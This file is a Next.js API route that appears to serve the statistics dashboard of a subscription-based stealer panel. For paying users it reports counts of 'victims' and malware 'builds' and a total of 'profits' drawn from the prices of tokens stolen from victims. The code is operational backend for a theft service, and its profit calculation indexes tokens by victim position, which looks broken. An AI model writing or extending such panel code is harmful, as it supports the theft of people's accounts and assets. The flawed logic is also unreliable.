import type { NextApiRequest, NextApiResponse } from 'next';
import { getAllBuilds, getAllVictims, mongo } from '@/server';
import { getSession } from 'next-auth/react';
import { Db } from 'mongodb';
import type { User } from '@/interfaces';

const getProfits = async (db: Db, id: string) => {
  let victims = (await getAllVictims(db, id)).data;
  let total = victims.reduce((sum: number, victim: any, i: number) => sum + victim.tokens[i]?.price, 0);
  return total;
};

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  try {
    const session = await getSession({ req });
    const user = session?.user as User | undefined;
    if (!user) throw Error('User is not logged in.');
    if (!user?.subscription?.key && !user.isAdmin)
      throw Error('You do not have a paid membership to perform this action!');
    const db = await mongo();
    let victims = (await getAllVictims(db, user.id)).count;
    let builds = (await getAllBuilds(db, user.id)).count;
    let profits = await getProfits(db, user.id);
    return res.status(200).json({
      victims,
      builds,
      profits
    });
  } catch (err: any) {
    res.status(500).json({
      statusCode: 500,
      message: err.message
    });
  }
}
